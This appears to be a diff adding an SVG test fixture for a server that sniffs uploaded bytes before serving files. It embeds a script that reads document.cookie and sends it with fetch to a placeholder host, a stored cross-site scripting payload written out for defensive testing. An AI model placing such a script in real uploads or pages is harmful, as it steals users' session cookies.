@@ -1,0 +1,16 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- A picture in the shape of a document. It starts with readable text, which is the whole
+     reason the server sniffs bytes instead of believing a `.svg` filename or a
+     `Content-Type: image/svg+xml` header: this file is not an image the server can serve
+     safely, and a browser asked to look at one would run whatever is inside it. -->
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="150" viewBox="0 0 200 150">
+  <rect width="200" height="150" fill="#e8a64b" />
+  <text x="12" y="80" font-family="sans-serif" font-size="18">a diagram</text>
+  <script type="text/javascript"><![CDATA[
+    // The reason this fixture exists. Nothing about it is clever: an <img> would not run it,
+    // and a board that put stored bytes in front of a person without saying what they are
+    // would be a board that shipped this script to everybody who ever opened the link.
+    document.cookie = 'session=stolen';
+    fetch('https://example.invalid/?' + document.cookie);
+  ]]></script>
+</svg>
